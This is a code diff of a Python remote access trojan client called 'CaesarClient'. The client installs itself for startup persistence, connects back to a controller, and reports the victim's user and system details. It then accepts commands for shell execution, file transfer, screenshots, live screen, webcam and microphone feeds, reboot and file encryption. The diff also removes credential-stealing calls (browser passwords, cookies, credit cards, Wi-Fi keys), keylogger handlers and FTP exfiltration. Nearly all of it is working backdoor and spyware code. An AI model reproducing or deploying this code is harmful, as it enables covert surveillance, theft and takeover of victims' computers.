@@ -1,11 +1,15 @@
-import socket
-import time
 import os
-import subprocess
-from general_features import GeneralFeatures
-from systeminfo_harvester import SystemInfoHarvester
-import winreg
 import sys
+import time
+import json
+import winreg
+import socket
+import getpass
+import datetime
+import platform
+import subprocess
+from getmac import get_mac_address as gma
+from general_features import GeneralFeatures
 
 
 
@@ -14,8 +18,8 @@ class CaesarClient:
     def __init__(self, host, port):
         self.host = host
         self.port = port
+        self.sock = None
         self.generalFeatures = GeneralFeatures()
-        self.systemInfoHarvester = SystemInfoHarvester()
 
 
     def add_to_startup(self, script_path):
@@ -34,48 +38,48 @@ class CaesarClient:
             #print(e)
 
 
+    # returns client system information to the server
+    def get_platform_info(self, conn):
+        sys_info = {
+            "mac-address": gma(),
+            "os": platform.uname().system,
+            "node-name": platform.uname().node,
+            "release": platform.uname().release,
+            "version": platform.uname().version,
+            "machine": platform.uname().machine,
+            "date-joined": str(datetime.date.today()),
+            "time-joined": str(datetime.datetime.now().time()),
+            "user": getpass.getuser()
+            }
+
+        system_info_string = json.dumps(sys_info)
+        conn.send(system_info_string.encode())
+
+
     #tries to connect back to the server
     def establish_connection(self):
         self.add_to_startup(os.path.abspath(sys.argv[0]))
 
-        sock = str()
         while True:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((self.host, self.port))
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.connect((self.host, self.port))
                 break
             except socket.error as err:
                 time.sleep(120) #try to reconnect after 2 minutes
 
 
-        ######################################## Harvest Target Info ###################################################
-
-        self.systemInfoHarvester.get_platform_info(sock)
-        self.systemInfoHarvester.send_installed_apps(sock)
-        self.systemInfoHarvester.get_user_startup_programs(sock)
-        self.systemInfoHarvester.get_wifi_password(sock)
-
-        self.systemInfoHarvester.get_browser_passwords(sock)
-        self.systemInfoHarvester.get_browser_cookies(sock)
-        self.systemInfoHarvester.retrieve_browser_history(sock)
-        self.systemInfoHarvester.retrieve_creditcard_info(sock)
-
-        self.systemInfoHarvester.retrieve_autofill_info(sock)
-        self.systemInfoHarvester.extract_memory_info(sock)
-        self.systemInfoHarvester.extract_disk_info(sock)
-        self.systemInfoHarvester.extract_network_info(sock)
-
-        self.systemInfoHarvester.get_user_activity(sock)
-        self.systemInfoHarvester.extract_other_info(sock)
-
-        ######################################## Harvest Target Info ###################################################
+        # send system info back to server
+        self.get_platform_info(self.sock)
 
 
-        #check command sent from the server
+
+
+        # check command sent from the server
         while True:
-            cmd = sock.recv(65536).decode()
+            cmd = self.sock.recv(65536).decode()
             if cmd == " ":
-                sock.send(self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode()) #send current working directory back to server
+                self.sock.send(self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode()) #send current working directory back to server
             elif cmd[:2] == 'cd':
                 #change directory
                 try:
@@ -85,72 +89,48 @@ class CaesarClient:
                     result = "\n" + result.decode()
                     if "The system cannot find the path specified." in result:
                         result = "\n"
-                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                        self.sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                     else:
-                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                        self.sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                 except(FileNotFoundError, IOError):
-                    sock.send("Directory does not exist!!! \n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send("Directory does not exist!!! \n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
             elif "get" in cmd:
-                self.generalFeatures.send_client_file(sock, cmd[4:])
+                self.generalFeatures.send_client_file(self.sock, cmd[4:])
 
             elif "send" in cmd:
                 usrFile = os.path.basename(cmd[5:])
-                self.generalFeatures.receive_server_file(sock, usrFile)
+                self.generalFeatures.receive_server_file(self.sock, usrFile)
             elif cmd == "screenshot":
-                self.generalFeatures.screenshot(sock)
+                self.generalFeatures.screenshot(self.sock)
             elif cmd == "screenfeed":
-                self.generalFeatures.live_screen_feed(sock)
+                self.generalFeatures.live_screen_feed(self.sock)
             elif cmd == "camshot":
-                self.generalFeatures.webcam_capture(sock)
+                self.generalFeatures.webcam_capture(self.sock)
             elif cmd == "camfeed":
-                self.generalFeatures.capture_webcam_video(sock)
+                self.generalFeatures.capture_webcam_video(self.sock)
             elif cmd == "audiofeed":
-                self.generalFeatures.live_audio_feed(sock)
-            elif "start keylogger" in cmd:
-                cmd = cmd.split()
-                self.generalFeatures.keylogger_handler(sock, cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
-            elif cmd == "stop keylogger":
-                self.generalFeatures.stop_keylogger(sock)
-            elif cmd == "keylogger status":
-                self.generalFeatures.is_keylogger_active(sock)
+                self.generalFeatures.live_audio_feed(self.sock)
             elif cmd == "reboot":
-                self.generalFeatures.reboot(sock)
+                self.generalFeatures.reboot(self.sock)
             elif cmd == "shutdown":
-                self.generalFeatures.shutdown(sock)
+                self.generalFeatures.shutdown(self.sock)
 
-
-            elif "ftp download" in cmd:
-                cmd = cmd.split(" ", 8)
-                if len(cmd) == 8:
-                    self.generalFeatures.download_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
-
-                elif len(cmd) > 8 or len(cmd) < 8:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-
-            elif "ftp upload" in cmd:
-                cmd = cmd.split(" ", 8)
-                if len(cmd) == 8:
-                    self.generalFeatures.upload_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
-
-                elif len(cmd) > 8 or len(cmd) < 8:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
             elif "encrypt" in cmd:
                 cmd = cmd.split(" ", 2)
 
                 if len(cmd) == 3:
-                    self.generalFeatures.encrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
+                    self.generalFeatures.encrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
             elif "decrypt" in cmd:
                 cmd = cmd.split(" ", 2)
                 if len(cmd) == 3:
-                    self.generalFeatures.decrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
+                    self.generalFeatures.decrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
             elif cmd == "conn check":
@@ -165,7 +145,7 @@ class CaesarClient:
 
                     terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                     terminal_output = terminal_output.decode()
-                    sock.send(str(terminal_output).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send(str(terminal_output).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                 except Exception as e:
-                    sock.send(str(e).encode() + "\n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send(str(e).encode() + "\n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
 
